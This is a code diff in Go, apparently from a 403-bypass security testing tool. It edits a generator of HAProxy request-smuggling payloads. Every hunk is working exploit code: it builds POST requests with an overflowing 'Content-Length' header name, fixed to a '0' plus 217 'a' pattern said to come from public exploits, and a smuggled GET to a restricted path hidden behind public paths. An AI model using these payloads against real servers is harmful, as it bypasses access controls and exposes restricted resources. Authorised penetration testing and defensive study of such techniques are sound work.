@@ -48,11 +48,8 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 	// We'll test various public endpoints before the restricted one
 	publicPaths := []string{
 		"/",
-		"/guest",
-		"/index.html",
-		"/index.php",
-		"/api",
-		"/public",
+		"/robots.txt",
+		"/index",
 	}
 
 	// This job will be used for Phase 2 (completion request)
@@ -70,57 +67,48 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 	// First generate the completion request - it will be sent after each Phase 1 request
 	allJobs = append(allJobs, completionJob)
 
-	// Generate various overflow patterns
-	overflowPatterns := []struct {
-		repeat string
-		count  int
-	}{
-		{"a", 200},     // Original working pattern
-		{"03v1L", 50},  // From JFrog PoC
-		{"0", 180},     // Numeric pattern
-		{"AAAAA", 180}, // Standard overflow pattern
-	}
+	// Generate overflow pattern - using the exact pattern from the PoC
+	// 217 'a' characters is what's used in the public exploits
+	overflowPattern := "0" + strings.Repeat("a", 217)
 
 	// For each public path, try to smuggle a request to the target path
 	for _, publicPath := range publicPaths {
-		for _, pattern := range overflowPatterns {
-			// Create the smuggled request based on the working example
-			// Important: Use \r\n instead of \n for proper HTTP formatting
-			smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
-				path,       // Target/restricted path
-				publicPath, // Public path for header value camouflage
-				host)
+		// Create the smuggled request based on the working example
+		// Important: Use \r\n instead of \n for proper HTTP formatting
+		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
+			path,       // Target/restricted path
+			publicPath, // Public path for header value camouflage
+			host)
 
-			// Calculate content length for the payload
-			contentLen := len(smuggledRequest)
+		// Calculate content length for the payload
+		contentLen := len(smuggledRequest)
 
-			// Create overflow Content-Length header
-			contentLengthName := "Content-Length" + strings.Repeat(pattern.repeat, pattern.count)
+		// Create overflow Content-Length header
+		contentLengthName := "Content-Length" + overflowPattern
 
-			// Create base payload for phase 1
-			job := BypassPayload{
-				OriginalURL:  targetURL,
-				Method:       "POST",
-				Scheme:       parsedURL.Scheme,
-				Host:         host,
-				RawURI:       publicPath, // Use the public path in the initial request
-				BypassModule: bypassModule,
-				Body:         smuggledRequest,
-				Headers: []Headers{
-					{
-						Header: contentLengthName,
-						Value:  "0",
-					},
-					{
-						Header: "Content-Length",
-						Value:  fmt.Sprintf("%d", contentLen),
-					},
+		// Create base payload for phase 1
+		job := BypassPayload{
+			OriginalURL:  targetURL,
+			Method:       "POST",
+			Scheme:       parsedURL.Scheme,
+			Host:         host,
+			RawURI:       publicPath, // Use the public path in the initial request
+			BypassModule: bypassModule,
+			Body:         smuggledRequest,
+			Headers: []Headers{
+				{
+					Header: contentLengthName,
+					Value:  "0",
 				},
-			}
-
-			job.PayloadToken = GeneratePayloadToken(job)
-			allJobs = append(allJobs, job)
+				{
+					Header: "Content-Length",
+					Value:  fmt.Sprintf("%d", contentLen),
+				},
+			},
 		}
+
+		job.PayloadToken = GeneratePayloadToken(job)
+		allJobs = append(allJobs, job)
 	}
 
 	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) for %s", len(allJobs), targetURL)
